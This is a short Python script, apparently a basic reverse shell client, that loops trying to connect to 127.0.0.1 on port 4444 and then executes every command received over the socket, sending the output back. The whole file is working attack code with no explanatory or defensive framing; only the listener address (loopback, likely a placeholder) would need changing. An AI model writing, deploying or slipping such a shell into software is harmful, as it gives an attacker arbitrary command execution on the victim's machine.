#!/usr/bin/python

import socket
import subprocess 
import sys

# ip = socket.gethostbyname(socket.gethostname())
ip = "127.0.0.1"
port = 4444

while True:
	try:
		sex = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		sex.connect((ip,port))
		break
	except:
		pass

while True:
	command = sex.recv(1024).decode()
	output = subprocess.getoutput(command)
	output = output.encode()
	sex.send(output)
